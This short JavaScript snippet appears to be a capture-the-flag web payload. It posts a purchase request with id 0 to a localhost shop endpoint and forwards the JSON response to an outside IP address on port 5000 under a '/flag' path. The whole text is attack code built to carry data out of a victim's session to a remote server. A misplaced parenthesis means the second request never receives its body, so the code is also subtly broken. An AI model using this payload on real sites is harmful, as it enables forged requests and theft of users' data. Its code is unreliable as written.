const fdata = new URLSearchParams();
fdata.append('id', '0');
fetch("https://localhost/buy", {
        method: "POST",
        body: fdata,
    })
    .then((response) => response.json())
    .then((data) => {
        fetch("http://120.26.219.126:5000/flag"), {
            method: "POST",
            body: data,
        }
    })
    .catch((error) => {
        console.error("Error:", error);
    });
